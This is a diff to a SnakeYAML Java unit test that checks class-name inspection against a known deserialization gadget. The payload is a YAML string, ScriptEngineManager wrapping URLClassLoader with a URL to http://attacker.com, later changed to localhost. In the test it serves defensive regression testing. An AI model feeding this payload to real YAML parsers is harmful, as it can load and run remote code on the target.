@@ -13,16 +13,16 @@
  */
 package org.yaml.snakeyaml.issues.issue564;
 
+import static org.junit.Assert.assertEquals;
+import static org.junit.Assert.assertNotNull;
+import static org.junit.Assert.assertTrue;
+import static org.junit.Assert.fail;
+
 import org.junit.Test;
 import org.yaml.snakeyaml.LoaderOptions;
 import org.yaml.snakeyaml.Yaml;
 import org.yaml.snakeyaml.constructor.ClassNameInspector;
 import org.yaml.snakeyaml.constructor.DefaultClassNameInspector;
-
-import static org.junit.Assert.assertEquals;
-import static org.junit.Assert.assertNotNull;
-import static org.junit.Assert.assertTrue;
-import static org.junit.Assert.fail;
 
 public class ClassNameInspectorTest {
 
@@ -34,8 +34,8 @@ public class ClassNameInspectorTest {
     try {
       String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
           + "[[!!java.net.URL [\"http://attacker.com\"]]]]";
-      Yaml yaml = new Yaml(); // Unsafe instance of Yaml that allows any constructor to be called.
-      yaml.load(malicious); // Make request to http://attacker.com
+      Yaml yaml = new Yaml();
+      yaml.load(malicious);
 
       fail("ScriptEngineManager should not be accepted");
     } catch (Exception e) {
@@ -56,10 +56,9 @@ public class ClassNameInspectorTest {
     });
 
     String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
-        + "[[!!java.net.URL [\"http://attacker.com\"]]]]";
-    Yaml yaml = new Yaml(options); // Unsafe instance of Yaml that allows any constructor to be
-    // called.
-    Object obj = yaml.load(malicious); // Make request to http://attacker.com
+        + "[[!!java.net.URL [\"http://localhost\"]]]]";
+    Yaml yaml = new Yaml(options);
+    Object obj = yaml.load(malicious);
     assertNotNull(obj);
   }
 
